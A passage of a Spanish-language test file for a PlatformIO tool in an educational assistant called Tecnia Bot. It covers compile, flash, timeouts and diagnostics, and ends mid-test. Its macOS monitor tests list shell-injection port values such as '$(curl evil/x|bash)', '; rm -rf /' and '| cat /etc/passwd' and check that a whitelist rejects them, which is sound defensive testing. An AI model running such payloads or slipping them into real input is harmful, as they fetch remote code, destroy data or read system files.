// Comportamiento de `execute()` en opencode/tool/platformio.ts: la tool más
// crítica de Tecnia Bot no tenía NI UN test de sus acciones, sólo de sus
// funciones puras.
//
// POR QUÉ EXISTE ESTE ARCHIVO. Tres cosas que pasaron en el aula:
//
//  1. "Se colgó." La primera compilación para una placa nueva baja cientos de
//     MB con una barra de progreso que por el pipe no se ve. `run()` no tenía
//     timeout: minutos de silencio, y la única salida era cerrar OpenCode.
//  2. Un `pio run` con warnings tira 3000 líneas por stderr y TODAS llegaban al
//     modelo, cuando `traducirError()` mira una sola.
//  3. En Windows, `Get-WmiObject` no existe en PowerShell 7 y la salida OEM se
//     decodificaba como UTF-8.
//
// Se simula PlatformIO con un `Bun.spawn` falso que devuelve salidas y códigos
// guionados, y se mira QUÉ comandos se lanzaron y en qué orden. Sin placa, sin
// PlatformIO, sin red.

import { test, before, after, beforeEach } from "node:test"
import assert from "node:assert/strict"
import { readFileSync, writeFileSync, mkdirSync, rmSync, existsSync } from "node:fs"
import { join, dirname, isAbsolute } from "node:path"
import { fileURLToPath } from "node:url"
import os from "node:os"

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..")
const OUT = join(os.tmpdir(), "tecniabot-platformio-execute-test")
const HOME_FALSO = join(OUT, "home")
const HOME_ORIGINAL = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE }

// ── Bun falso ────────────────────────────────────────────────────────────────
//
// `spawns` acumula cada argv lanzado; `guion` decide qué contesta cada comando.
// Un guion que devuelve un Error hace que spawn lo tire (pio no instalado).

let spawns = []
let guion = () => ({})

function respuesta(cmd) {
  const r = guion(cmd)
  if (r instanceof Error) throw r
  const proc = {
    stdout: r.stdout ?? "",
    stderr: r.stderr ?? "",
    exited: r.exited ?? Promise.resolve(r.code ?? 0),
    matado: false,
    unref() {},
    kill() {
      proc.matado = true
    },
  }
  return proc
}

globalThis.Bun = {
  which: () => null,
  spawn(cmd, opts) {
    const entrada = { cmd, opts, proc: null }
    spawns.push(entrada)
    entrada.proc = respuesta(cmd)
    return entrada.proc
  },
}

const lanzados = () => spawns.map((s) => s.cmd.join(" "))
const indice = (fragmento) => lanzados().findIndex((l) => l.includes(fragmento))

/** Un pio "instalado" que contesta lo típico; cada test pisa lo que necesita. */
function escenario({ lista = [], compile = { code: 0 }, upload = { code: 0 }, powershell = { code: 0 } } = {}) {
  guion = (cmd) => {
    const s = cmd.join(" ")
    if (cmd[0] === "powershell") return powershell
    if (s.includes("--version")) return { stdout: "PlatformIO Core, version 6.1.15\n" }
    if (s.includes("device list")) return { stdout: JSON.stringify(lista) }
    if (s.includes("--target upload")) return upload
    if (s.includes(" run")) return compile
    return {}
  }
}

/** Un proceso que no termina nunca: pipes abiertos y `exited` que jamás resuelve. */
const COLGADO = () => ({
  stdout: new ReadableStream({ start() {} }),
  stderr: new ReadableStream({ start() {} }),
  exited: new Promise(() => {}),
})

const CH340 = { port: "/dev/ttyUSB0", hwid: "USB VID:PID=1A86:7523 LOCATION=1-1", description: "USB2.0-Serial" }

let mod
let ctx

before(async () => {
  if (existsSync(OUT)) rmSync(OUT, { recursive: true })
  mkdirSync(HOME_FALSO, { recursive: true })
  process.env.HOME = HOME_FALSO
  process.env.USERPROFILE = HOME_FALSO
  writeFileSync(
    join(OUT, "mock-plugin.ts"),
    "const chain=new Proxy(function(){return chain},{get:()=>chain,apply:()=>chain});export const tool=(c)=>c;tool.schema=chain;",
  )
  const src = readFileSync(join(REPO, "opencode/tool/platformio.ts"), "utf8")
    .replace('/// <reference path="../env.d.ts" />', "")
    .replace('import { tool } from "@opencode-ai/plugin"', 'import { tool } from "./mock-plugin.ts"')
  writeFileSync(join(OUT, "platformio.ts"), src)
  mod = await import(join(OUT, "platformio.ts"))
  ctx = { directory: OUT, abort: new AbortController().signal }
})

beforeEach(() => {
  spawns = []
  delete process.env.TECNIA_PIO_TIMEOUT_MS
  escenario()
})

after(() => {
  process.env.HOME = HOME_ORIGINAL.HOME
  process.env.USERPROFILE = HOME_ORIGINAL.USERPROFILE
})

// ── compile ──────────────────────────────────────────────────────────────────

test("compile OK: dice que compiló y NO pega el stderr (los warnings no son noticia)", async () => {
  escenario({ compile: { code: 0, stdout: "[SUCCESS] Took 2.10 seconds", stderr: "src/main.cpp:3: warning: unused variable 'x'\n" } })
  const r = await mod.default.execute({ action: "compile" }, ctx)
  assert.match(r, /Compilacion exitosa/)
  assert.doesNotMatch(r, /unused variable/, "el stderr de un éxito no tiene por qué llegar al modelo")
})

/** 300 líneas de stderr con UN error en el medio: lo que tira un sketch con una librería ruidosa. */
function stderrLargo() {
  const lineas = []
  for (let i = 1; i <= 300; i++) {
    if (i === 150) lineas.push("src/main.cpp:150:3: error: 'Serial1' was not declared in this scope")
    else lineas.push(`.pio/libdeps/uno/Ruidosa/Ruidosa.cpp:${i}:5: warning: unused variable 'v${i}' [-Wunused-variable]`)
  }
  lineas.push("*** [.pio/build/uno/src/main.cpp.o] Error 1")
  return lineas.join("\n") + "\n"
}

test("compile con 300 líneas de stderr: traduce el error y recorta lo que muestra", async () => {
  escenario({ compile: { code: 1, stderr: stderrLargo() } })
  const r = await mod.default.execute({ action: "compile" }, ctx)

  assert.match(r, /Usaste la variable o funcion 'Serial1'/, "perdió la traducción: traducirError tiene que ver el texto completo")
  assert.match(r, /error: 'Serial1' was not declared/, "la línea del error tiene que estar en el original")
  assert.match(r, /\*\*\* \[\.pio\/build\/uno\/src\/main\.cpp\.o\] Error 1/, "las últimas líneas dicen cómo terminó")
  assert.match(r, /… \(\d+ líneas omitidas\)/, "tiene que avisar que recortó, y cuánto")
  assert.doesNotMatch(r, /'v20'/, "una línea lejos del error no tiene que llegar")

  const total = r.split("\n").length
  assert.ok(total <= 60, `el mensaje tiene ${total} líneas: el modelo recibía la pared entera`)
})

test("compile cuando pio no está: contesta pioNoEncontrado() con 'reparar' primero", async () => {
  guion = () => new Error("ENOENT")
  const r = await mod.default.execute({ action: "compile" }, ctx)
  assert.match(r, /PlatformIO no esta instalado/)
  assert.match(r, /action: "reparar"/, "la primera salida tiene que ser reparar desde el propio tool")
  assert.match(r, /Menu inicio -> 'Reparar Tecnia Bot'/, "y el menú inicio, como plan B")
  assert.equal(indice(" run"), -1, "no tiene sentido intentar compilar sin pio")
})

// ── flash ────────────────────────────────────────────────────────────────────

test("flash sin placa: 'no encuentro ninguna placa' y NO intenta cargar", async () => {
  escenario({ lista: [] })
  const r = await mod.default.execute({ action: "flash" }, ctx)
  assert.match(r, /No encuentro ninguna placa conectada/)
  assert.match(r, /\/diagnostico/, "tiene que ofrecer el diagnóstico: puede faltar el driver")
  assert.equal(indice("--target upload"), -1, "intentó cargar sin puerto")
})

test("flash con un CH340 enchufado: detecta el puerto y se lo pasa a pio con --upload-port", async () => {
  escenario({ lista: [CH340] })
  const r = await mod.default.execute({ action: "flash" }, ctx)
  assert.match(r, /Codigo cargado exitosamente en \/dev\/ttyUSB0/)
  const upload = spawns.find((s) => s.cmd.join(" ").includes("--target upload"))
  assert.ok(upload, "no lanzó la carga")
  const i = upload.cmd.indexOf("--upload-port")
  assert.notEqual(i, -1, "la carga tiene que llevar --upload-port")
  assert.equal(upload.cmd[i + 1], "/dev/ttyUSB0")
})

test("flash a un ESP32 que no responde, enterrado en 300 líneas: la traducción sale del texto COMPLETO", async () => {
  // La línea de esptool no tiene `error:` ni `Error`, así que el recorte no la
  // conserva. Si se tradujera DESPUÉS de recortar, el docente perdería el único
  // consejo que le sirve (apretar BOOT).
  const lineas = Array.from({ length: 300 }, (_, i) =>
    i === 150
      ? "A fatal error occurred: Failed to connect to ESP32: Timed out waiting for packet header"
      : `.pio/libdeps/esp32dev/Ruidosa/Ruidosa.cpp:${i + 1}:5: warning: unused variable 'v${i + 1}'`,
  )
  escenario({ lista: [CH340], upload: { code: 1, stderr: lineas.join("\n") + "\n" } })
  const r = await mod.default.execute({ action: "flash" }, ctx)
  assert.match(r, /Apreta el boton BOOT/, "tradujo sobre el texto recortado y perdió la línea de esptool")
  assert.match(r, /líneas omitidas/, "y aun así recorta lo que muestra")
})

test("flash con sólo el COM1 de una VM: lo nombra y dice que no es una placa", async () => {
  escenario({ lista: [{ port: "COM1", hwid: "ACPI\\PNP0501\\1", description: "Puerto de comunicaciones (COM1)" }] })
  const r = await mod.default.execute({ action: "flash" }, ctx)
  assert.match(r, /Veo un puerto serie \(COM1\), pero no es una placa/)
  assert.equal(indice("--target upload"), -1)
})

// ── both ─────────────────────────────────────────────────────────────────────

test("both: compila, DESPUÉS busca la placa, DESPUÉS carga — en ese orden", async () => {
  escenario({ lista: [CH340] })
  const r = await mod.default.execute({ action: "both" }, ctx)
  assert.match(r, /Compilacion y carga exitosa en \/dev\/ttyUSB0/)

  const iCompile = lanzados().findIndex((l) => l.endsWith(" run"))
  const iLista = indice("device list")
  const iUpload = indice("--target upload")
  assert.ok(iCompile !== -1 && iLista !== -1 && iUpload !== -1, `faltó algún paso: ${lanzados().join(" | ")}`)
  assert.ok(iCompile < iLista, "buscó la placa antes de saber si el código compila")
  assert.ok(iLista < iUpload, "cargó antes de saber a dónde")
})

test("both: si la compilación falla, NO se intenta cargar", async () => {
  escenario({ lista: [CH340], compile: { code: 1, stderr: "src/main.cpp:5:1: error: expected ';' before 'digitalWrite'\n" } })
  const r = await mod.default.execute({ action: "both" }, ctx)
  assert.match(r, /no se intento cargar/)
  assert.match(r, /Falta un punto y coma/)
  assert.equal(indice("--target upload"), -1, "cargó un binario que no existe")
})

// ── timeout y cancelación ────────────────────────────────────────────────────

test("run(): un proceso que no termina nunca se corta por timeout con código 124", async () => {
  guion = COLGADO
  const arranque = Date.now()
  const r = await mod.run(["pio", "run"], OUT, undefined, 50)
  assert.equal(r.code, mod.CODIGO_TIMEOUT)
  assert.equal(r.code, 124)
  assert.match(r.stderr, /no termino en/)
  assert.ok(Date.now() - arranque < 5000, "el timeout no cortó: se quedó esperando al pipe")
  assert.equal(spawns[0].proc.matado, true, "al cortar hay que matar el proceso")
})

test("compile colgado: el mensaje explica la descarga y le dice al bot que NO reintente", async () => {
  process.env.TECNIA_PIO_TIMEOUT_MS = "50"
  escenario()
  const base = guion
  guion = (cmd) => (cmd.join(" ").endsWith(" run") ? COLGADO() : base(cmd))

  const r = await mod.default.execute({ action: "compile" }, ctx)
  // 2026-10-14, taller: el mensaje viejo decía "probá de nuevo, la segunda vez es rápido",
  // el bot reintentó solo y la docente esperó 15 + 15 minutos. La segunda vez no fue rápida.
  assert.match(r, /bajando herramientas sin mostrar progreso, o que se haya colgado/)
  assert.match(r, /NO lo vuelvas a intentar ahora/)
  assert.doesNotMatch(r, /la segunda vez es rápido/)
  assert.doesNotMatch(r, /Error de compilacion/, "un timeout no es un error del código del alumno")
})

test("both: si la carga se cuelga, avisa del timeout de la carga (el compile ya fue)", async () => {
  process.env.TECNIA_PIO_TIMEOUT_MS = "50"
  escenario({ lista: [CH340] })
  const base = guion
  guion = (cmd) => (cmd.join(" ").includes("--target upload") ? COLGADO() : base(cmd))
  const r = await mod.default.execute({ action: "both" }, ctx)
  assert.match(r, /no termine de cargar el codigo/)
  assert.match(r, /NO lo vuelvas a intentar ahora/)
})

test("run(): ctx.abort sigue cortando el proceso (código 130, sin esperar el timeout)", async () => {
  guion = COLGADO
  const ctrl = new AbortController()
  setTimeout(() => ctrl.abort(), 20)
  const arranque = Date.now()
  const r = await mod.run(["pio", "run"], OUT, ctrl.signal, 60_000)
  assert.equal(r.code, mod.CODIGO_CANCELADO)
  assert.ok(Date.now() - arranque < 5000, "ignoró el abort del usuario")
  assert.equal(spawns[0].proc.matado, true)
  // Y la señal combinada le llegó a Bun, que es quien mata el proceso de verdad.
  assert.ok(spawns[0].opts.signal instanceof AbortSignal, "no le pasa la señal a Bun.spawn")
})

test("run(): sin AbortSignal.any (Bun viejo) la composición manual hace lo mismo", async () => {
  const anyOriginal = AbortSignal.any
  Object.defineProperty(AbortSignal, "any", { value: undefined, configurable: true, writable: true })
  try {
    guion = COLGADO
    const ctrl = new AbortController()
    setTimeout(() => ctrl.abort(), 20)
    const r = await mod.run(["pio", "run"], OUT, ctrl.signal, 60_000)
    assert.equal(r.code, mod.CODIGO_CANCELADO)
    // Y el timeout también, por el otro camino.
    const t = await mod.run(["pio", "run"], OUT, new AbortController().signal, 50)
    assert.equal(t.code, mod.CODIGO_TIMEOUT)
  } finally {
    Object.defineProperty(AbortSignal, "any", { value: anyOriginal, configurable: true, writable: true })
  }
})

test("run(): una señal ya abortada no lanza nada", async () => {
  const ctrl = new AbortController()
  ctrl.abort()
  const r = await mod.run(["pio", "run"], OUT, ctrl.signal)
  assert.equal(r.code, mod.CODIGO_CANCELADO)
  assert.equal(spawns.length, 0)
})

// ── diagnostico ──────────────────────────────────────────────────────────────

test("diagnostico fuera de Windows: no le pregunta a PowerShell", async () => {
  assert.notEqual(process.platform, "win32", "este test corre la rama no-Windows")
  escenario({ lista: [] })
  const r = await mod.default.execute({ action: "diagnostico" }, ctx)
  assert.match(r, /Ninguna placa conectada/)
  assert.equal(indice("powershell"), -1, `lanzó PowerShell en ${process.platform}: ${lanzados().join(" | ")}`)
})

test("diagnostico en Windows (simulado): Get-CimInstance en UTF-8, y lee el CH340 sin driver", async () => {
  const original = Object.getOwnPropertyDescriptor(process, "platform")
  Object.defineProperty(process, "platform", { value: "win32", configurable: true })
  try {
    const sinDriver = JSON.stringify({
      Name: "USB2.0-Serial",
      DeviceID: "USB\\VID_1A86&PID_7523\\5&1D2A3B4C&0&2",
      ConfigManagerErrorCode: 28,
    })
    escenario({ lista: [], powershell: { code: 0, stdout: sinDriver } })
    const r = await mod.default.execute({ action: "diagnostico" }, ctx)

    assert.match(r, /Hay una placa enchufada, pero Windows no la puede usar/)
    assert.match(r, /le falta el driver/)
    assert.match(r, /wch-ic\.com/)

    const ps = spawns.find((s) => s.cmd[0] === "powershell")
    assert.ok(ps, "no consultó a Windows")
    const comando = ps.cmd[ps.cmd.length - 1]
    assert.match(comando, /^\[Console\]::OutputEncoding=\[Text\.Encoding\]::UTF8;/, "la salida OEM se decodifica como UTF-8: hay que pedirla en UTF-8")
    assert.match(comando, /Get-CimInstance Win32_PnPEntity/, "Get-WmiObject no existe en PowerShell 7")
    assert.doesNotMatch(comando, /Get-WmiObject/)
    assert.match(comando, /Select-Object Name, DeviceID, ConfigManagerErrorCode/, "leerDispositivosConProblema lee esas tres propiedades")
  } finally {
    Object.defineProperty(process, "platform", original)
  }
})

// ── monitor en macOS: whitelist del puerto antes de armar el AppleScript ──────
//
// `puerto` va interpolado en un string que Terminal.app corre en un shell
// POSIX real: ese shell expande `$(...)` aunque este entre comillas dobles, asi
// que un puerto como `$(curl evil/x|bash)` ejecuta codigo en la Mac del
// docente. La defensa es una whitelist fail-closed (`puertoValido()`): sólo
// puede RECHAZAR, nunca cambiar lo que se ejecuta cuando el puerto es valido —
// por eso el primer test de este bloque compara el comando armado, byte por
// byte, contra lo que armaba el codigo de antes del cambio.
//
// `process.platform` se pisa a "darwin" como ya hacen los tests de Windows en
// el otro archivo (`platformio-pio.test.mjs`), y se restaura siempre en un
// `finally` para no filtrarle la plataforma falsa a los tests que corren
// despues (node --test comparte el módulo entero).

function comoDarwin() {
  return Object.defineProperty(process, "platform", { value: "darwin", configurable: true })
}

test("puertoValido(): acepta las formas reales de las tres plataformas", () => {
  // Windows — detectPort() lee /COM\d+/g del stdout crudo cuando el JSON no parsea.
  assert.equal(mod.puertoValido("COM3"), true)
  assert.equal(mod.puertoValido("COM12"), true)
  assert.equal(mod.puertoValido("com3"), true, "el driver no distingue mayusculas")
  // Linux — mismo fallback, /dev/tty(USB|ACM)\d+.
  assert.equal(mod.puertoValido("/dev/ttyUSB0"), true)
  assert.equal(mod.puertoValido("/dev/ttyACM0"), true)
  // macOS — lo que devuelve pyserial ahí: /dev/cu.* y /dev/tty.* con nombre de chip.
  assert.equal(mod.puertoValido("/dev/cu.usbserial-14140"), true)
  assert.equal(mod.puertoValido("/dev/tty.usbserial-14140"), true)
  assert.equal(mod.puertoValido("/dev/cu.SLAB_USBtoUART"), true)
  assert.equal(mod.puertoValido("/dev/cu.Bluetooth-Incoming-Port"), true)
})

test("puertoValido(): rechaza los vectores de inyeccion de shell", () => {
  const vectores = [
    "$(curl evil/x|bash)",
    "/dev/ttyUSB0$(curl evil/x|bash)",
    "`curl evil/x|bash`",
    "/dev/ttyUSB0; rm -rf /",
    "/dev/ttyUSB0 && rm -rf /",
    "/dev/ttyUSB0 | cat /etc/passwd",
    "/dev/ttyUSB0\nrm -rf /",
    '/dev/ttyUSB0"; touch /tmp/pwn; echo "',
    "/dev/ttyUSB0'; touch /tmp/pwn; echo '",
    "/dev/ttyUSB0 & echo pwned",
    "",
    "cualquier cosa",
  ]
  for (const v of vectores) {
    assert.equal(mod.puertoValido(v), false, `deberia rechazar: ${JSON.stringify(v)}`)
  }
})

test("monitor en macOS con puerto valido: el AppleScript es BYTE POR BYTE el mismo de antes del cambio", async () => {
  const original = comoDarwin()
  try {
    escenario()
    const puerto = "/dev/cu.usbserial-14140"
    const r = await mod.default.execute({ action: "monitor", port: puerto, baud: 115200 }, ctx)
    assert.match(r, /Abri una ventana nueva/, "un puerto valido tiene que abrir el monitor, no rechazarlo")

    const lanzado = spawns.find((s) => s.cmd[0] === "osascript")
    assert.ok(lanzado, `no lanzo osascript: ${lanzados().join(" | ")}`)

    // Reconstruccion INDEPENDIENTE de la logica de antes del cambio (mismas
    // reglas que quoteIfNeeded + el armado del script): si esto no matchea,
    // el fix cambio lo que se ejecuta para un puerto valido, y eso es
    // exactamente lo que el criterio del usuario prohibe.
    const pioPath = "pio" // sin PlatformIO instalado en el HOME falso del test
    const shellCmdEsperado = `${pioPath} device monitor --port ${puerto} --baud 115200`
    const scriptEsperado = `tell application "Terminal" to do script "${shellCmdEsperado}"`
    assert.equal(lanzado.cmd[2], scriptEsperado)
  } finally {
    Object.defineProperty(process, "platform", original)
  }
})

test("monitor en macOS con puerto malicioso: RECHAZA y no lanza osascript ni nada con 'curl'", async () => {
  const original = comoDarwin()
  try {
    escenario()
    const puerto = "$(curl evil/x|bash)"
    const r = await mod.default.execute({ action: "monitor", port: puerto }, ctx)
    assert.match(r, /No reconozco ese puerto/)
    assert.match(r, /cu\.usbserial/, "tiene que decir que forma se esperaba")
    assert.equal(indice("osascript"), -1, "no tiene que abrir ninguna terminal con un puerto invalido")
    // Antes de llegar a "monitor", execute() ya corrio el pre-chequeo `pio --version`
    // (linea ~841): ese es el UNICO spawn esperado. Nada mas se lanzo con el puerto
    // malicioso adentro — en particular, ningun comando lleva "curl".
    assert.equal(spawns.length, 1, `se lanzo algo de mas: ${lanzados().join(" | ")}`)
    assert.ok(!lanzados().some((l) => l.includes("curl")), "el vector de inyeccion no debe llegar a ningun spawn")
  } finally {
    Object.defineProperty(process, "platform", original)
  }
})

// ── recortarSalida (pura) ────────────────────────────────────────────────────

test("recortarSalida: lo corto pasa entero, con o sin CRLF", () => {
  assert.equal(mod.recortarSalida("a\nb\nc\n"), "a\nb\nc")
  assert.equal(mod.recortarSalida("a\r\nb\r\n"), "a\nb")
})

test("recortarSalida: sin error, primeras 15 + últimas 10 y el conteo exacto de omitidas", () => {
  const lineas = Array.from({ length: 100 }, (_, i) => `L${i + 1}`)
  const r = mod.recortarSalida(lineas.join("\n")).split("\n")
  assert.equal(r[0], "L1")
  assert.equal(r[14], "L15")
  assert.equal(r[15], "… (75 líneas omitidas)")
  assert.equal(r[16], "L91")
  assert.equal(r[r.length - 1], "L100")
  assert.equal(r.length, 26)
})

test("recortarSalida: el error cerca del final se une con la cola sin marcador duplicado", () => {
  const lineas = Array.from({ length: 100 }, (_, i) => (i === 94 ? "x.cpp:1: error: boom" : `L${i + 1}`))
  const r = mod.recortarSalida(lineas.join("\n"))
  assert.equal((r.match(/omitidas/g) ?? []).length, 1, "un solo tramo omitido, el de adelante")
  assert.match(r, /^… \(79 líneas omitidas\)\nL80\n/)
  assert.match(r, /error: boom/)
  assert.match(r, /\nL100$/)
})

// ── herramientas de la placa que faltan (primera compilación) ────────────────

test("herramientasFaltantes(): ESP32 sin toolchain se detecta; con todo bajado, nada", () => {
  const ini = "[env:esp32dev]\nplatform = espressif32@6.12.0\nboard = esp32dev\n"
  const nada = () => false
  const todo = () => true
  assert.deepEqual(mod.herramientasFaltantes(ini, "/core", nada), ["ESP32"])
  assert.deepEqual(mod.herramientasFaltantes(ini, "/core", todo), [])
  // Sin versión (como lo escribía el prompt hasta la 0.4.5) también se reconoce.
  assert.deepEqual(mod.herramientasFaltantes("platform = espressif32\n", "/core", nada), ["ESP32"])
  assert.deepEqual(mod.herramientasFaltantes("platform = platformio/atmelavr@5.2.0\n", "/core", nada), ["Arduino UNO"])
  // Mira la carpeta packages del core.
  const vistos = []
  mod.herramientasFaltantes(ini, "/core", (r) => (vistos.push(r), true))
  assert.ok(vistos.some((v) => v.endsWith(join("packages", "toolchain-xtensa-esp32"))), vistos.join(","))
})

test("coreDir(): la regla de PlatformIO (C:\\.platformio gana si existe, aunque pio este en el perfil)", () => {
  const home = "C:\\Users\\docente"
  assert.equal(mod.coreDir(home, "win32", {}, () => false), "C:\\Users\\docente\\.platformio")
  // Paso en la VM: un C:\.platformio viejo y el aviso miraba la carpeta equivocada.
  assert.equal(mod.coreDir(home, "win32", {}, (r) => r === "C:\\.platformio"), "C:\\.platformio")
  assert.equal(mod.coreDir("D:\\perfiles\\ana", "win32", {}, (r) => r === "D:\\.platformio"), "D:\\.platformio")
  assert.equal(mod.coreDir(home, "win32", { PLATFORMIO_CORE_DIR: "E:\\pio" }, () => true), "E:\\pio")
  assert.equal(mod.coreDir("/home/ana", "linux", {}, () => true), join("/home/ana", ".platformio"))
})

test("timeoutCompilarMs(): sin herramientas espera 3 minutos, no 15", () => {
  delete process.env.TECNIA_PIO_TIMEOUT_MS
  assert.equal(mod.timeoutCompilarMs([]), 15 * 60_000)
  assert.equal(mod.timeoutCompilarMs(["ESP32"]), 3 * 60_000)
  // La variable de los tests manda si es más corta.
  process.env.TECNIA_PIO_TIMEOUT_MS = "50"
  assert.equal(mod.timeoutCompilarMs(["ESP32"]), 50)
  delete process.env.TECNIA_PIO_TIMEOUT_MS
})

test("compile sin las herramientas de ESP32: avisa en el título y el timeout nombra la placa", async () => {
  process.env.TECNIA_PIO_TIMEOUT_MS = "50"
  process.env.PLATFORMIO_CORE_DIR = join(OUT, "core-vacio")
  try {
    escenario()
    writeFileSync(join(OUT, "platformio.ini"), "[env:esp32dev]\nplatform = espressif32@6.12.0\nboard = esp32dev\nframework = arduino\n")
    const base = guion
    guion = (cmd) => (cmd.join(" ").endsWith(" run") ? COLGADO() : base(cmd))
    const titulos = []
    const r = await mod.default.execute({ action: "compile" }, { ...ctx, metadata: (m) => titulos.push(m.title) })
    assert.ok(titulos.some((t) => /Bajando las herramientas de ESP32/.test(t)), `sin aviso: ${titulos}`)
    assert.match(r, /Faltaban las herramientas de ESP32/)
    assert.match(r, /NO lo vuelvas a intentar ahora/)
    // En la VM el bot ofreció "correr un diagnóstico" y no le dijo al docente cómo conseguirlas.
    assert.match(r, /volver a correr el instalador/)
    assert.match(r, /pendrive/)
    assert.match(r, /no ofrezcas un diagnóstico en lugar de esto/)
    // /actualizar NO las baja (TECNIA_DESDE_ACTUALIZAR=1): mandar ahí era mandar al único camino que no sirve.
    assert.doesNotMatch(r, /Actualizar Tecnia Bot con buena red/)
    // El pendrive nombra la carpeta REAL de destino: la de coreDir(), acá PLATFORMIO_CORE_DIR.
    assert.ok(r.includes(join(OUT, "core-vacio")), `el mensaje no nombra el core real: ${r}`)
  } finally {
    delete process.env.PLATFORMIO_CORE_DIR
    rmSync(join(OUT, "platformio.ini"), { force: true })
  }
})

// ── el tope de cada espera, medido de verdad ─────────────────────────────────
//
// Se espía `AbortSignal.timeout`: se guardan los ms que pidió `run()` y, para los
// comandos largos, se devuelve una señal de 1 ms para no esperar 3 minutos. Los
// cortos (`pio --version`, `device list`: 60 s) pasan tal cual, porque el pio
// falso contesta al instante y no tienen que cortarse.

async function conTimeoutsEspiados(fn) {
  const orig = AbortSignal.timeout
  const pedidos = []
  AbortSignal.timeout = (ms) => {
    pedidos.push(ms)
    return orig.call(AbortSignal, ms > 60_000 ? 1 : ms)
  }
  try {
    return { r: await fn(), pedidos }
  } finally {
    AbortSignal.timeout = orig
  }
}

const INI_ESP32 = "[env:esp32dev]\nplatform = espressif32@6.12.0\nboard = esp32dev\nframework = arduino\n"

/** Proyecto ESP32 con un core propio (vacío o con los paquetes pedidos), y lo limpia al final. */
async function conProyectoEsp32(paquetes, fn) {
  const core = join(OUT, `core-${Math.random().toString(36).slice(2)}`)
  for (const p of paquetes) mkdirSync(join(core, "packages", p), { recursive: true })
  mkdirSync(core, { recursive: true })
  process.env.PLATFORMIO_CORE_DIR = core
  writeFileSync(join(OUT, "platformio.ini"), INI_ESP32)
  try {
    return await fn(core)
  } finally {
    delete process.env.PLATFORMIO_CORE_DIR
    rmSync(join(OUT, "platformio.ini"), { force: true })
    rmSync(core, { recursive: true, force: true })
  }
}

test("compile sin herramientas: el corte es a los 3 minutos y el mensaje lo dice", async () => {
  await conProyectoEsp32([], async () => {
    escenario()
    const base = guion
    guion = (cmd) => (cmd.join(" ").endsWith(" run") ? COLGADO() : base(cmd))
    const { r, pedidos } = await conTimeoutsEspiados(() => mod.default.execute({ action: "compile" }, ctx))
    assert.ok(pedidos.includes(180_000), `no se pidió el corte de 3 min: ${pedidos}`)
    assert.ok(!pedidos.includes(900_000), `se esperó 15 min sin herramientas: ${pedidos}`)
    assert.match(r, /No termine de compilar en 3 minutos/)
  })
})

test("compile con herramientas: el corte es a los 15 minutos", async () => {
  await conProyectoEsp32(["framework-arduinoespressif32", "toolchain-xtensa-esp32"], async () => {
    escenario()
    const base = guion
    guion = (cmd) => (cmd.join(" ").endsWith(" run") ? COLGADO() : base(cmd))
    const titulos = []
    const { r, pedidos } = await conTimeoutsEspiados(() =>
      mod.default.execute({ action: "compile" }, { ...ctx, metadata: (m) => titulos.push(m.title) }),
    )
    assert.ok(pedidos.includes(900_000), `con herramientas tiene que esperar 15 min: ${pedidos}`)
    assert.ok(!pedidos.includes(180_000), `cortó a los 3 min con todo bajado: ${pedidos}`)
    assert.match(r, /No termine de compilar en 15 minutos/)
    assert.doesNotMatch(r, /Faltaban las herramientas/)
    assert.equal(titulos.length, 0, `avisó una descarga que no hay: ${titulos}`)
  })
})

test("flash sin herramientas: avisa la descarga y corta a los 3 minutos (upload también compila)", async () => {
  await conProyectoEsp32([], async (core) => {
    escenario({ lista: [CH340] })
    const base = guion
    guion = (cmd) => (cmd.join(" ").includes("--target upload") ? COLGADO() : base(cmd))
    const titulos = []
    const { r, pedidos } = await conTimeoutsEspiados(() =>
      mod.default.execute({ action: "flash" }, { ...ctx, metadata: (m) => titulos.push(m.title) }),
    )
    assert.ok(titulos.some((t) => /Bajando las herramientas de ESP32/.test(t)), `flash no avisó la descarga: ${titulos}`)
    assert.ok(pedidos.includes(180_000), `flash sin herramientas no cortó a los 3 min: ${pedidos}`)
    assert.ok(!pedidos.includes(900_000), `flash esperó 15 min sin herramientas: ${pedidos}`)
    assert.match(r, /No termine de cargar el codigo en 3 minutos/)
    assert.match(r, /Faltaban las herramientas de ESP32/)
    assert.ok(r.includes(core), "el pendrive tiene que nombrar el core real")
  })
})

test("flash con herramientas: espera 15 minutos y no avisa descarga", async () => {
  await conProyectoEsp32(["framework-arduinoespressif32", "toolchain-xtensa-esp32"], async () => {
    escenario({ lista: [CH340] })
    const base = guion
    guion = (cmd) => (cmd.join(" ").includes("--target upload") ? COLGADO() : base(cmd))
    const titulos = []
    const { r, pedidos } = await conTimeoutsEspiados(() =>
      mod.default.execute({ action: "flash" }, { ...ctx, metadata: (m) => titulos.push(m.title) }),
    )
    assert.ok(pedidos.includes(900_000), `flash con herramientas tiene que esperar 15 min: ${pedidos}`)
    assert.ok(!pedidos.includes(180_000), `flash cortó a los 3 min con todo bajado: ${pedidos}`)
    assert.doesNotMatch(r, /Faltaban las herramientas/)
    assert.equal(titulos.length, 0, `avisó una descarga que no hay: ${titulos}`)
  })
})

test("TECNIA_PIO_TIMEOUT_MS con decimales o enorme: queda en un entero que AbortSignal.timeout acepta", () => {
  try {
    process.env.TECNIA_PIO_TIMEOUT_MS = "1500.5"
    assert.equal(mod.timeoutCompilarMs(["ESP32"]), 1500)
    process.env.TECNIA_PIO_TIMEOUT_MS = String(2 ** 40)
    assert.equal(mod.timeoutLargoMs(), 2 ** 31 - 1)
    assert.doesNotThrow(() => AbortSignal.timeout(mod.timeoutLargoMs()))
  } finally {
    delete process.env.TECNIA_PIO_TIMEOUT_MS
  }
})

test("both con corte en la CARGA (la compilación terminó bien): no habla de herramientas ni de pendrive", async () => {
  // El core está vacío al compilar (faltaban), pero el compile terminó bien: el
  // corte en la carga no tiene nada que ver con las herramientas de compilar.
  await conProyectoEsp32([], async () => {
    escenario({ lista: [CH340], compile: { code: 0 } })
    const base = guion
    guion = (cmd) => (cmd.join(" ").includes("--target upload") ? COLGADO() : base(cmd))
    const { r, pedidos } = await conTimeoutsEspiados(() => mod.default.execute({ action: "both" }, ctx))
    assert.match(r, /La compilación terminó bien, pero no termine de cargar el codigo en 15 minutos/)
    assert.doesNotMatch(r, /pendrive/i)
    assert.doesNotMatch(r, /Faltaban las herramientas/)
    assert.equal(pedidos.filter((ms) => ms === 900_000).length, 1, `la carga después de compilar espera el tope largo: ${pedidos}`)
  })
})

test("coreDir(): PLATFORMIO_CORE_DIR vacía se ignora; perfil UNC; perfil vacío o relativo da ruta absoluta", () => {
  const nada = () => false
  const home = "C:\\Users\\docente"
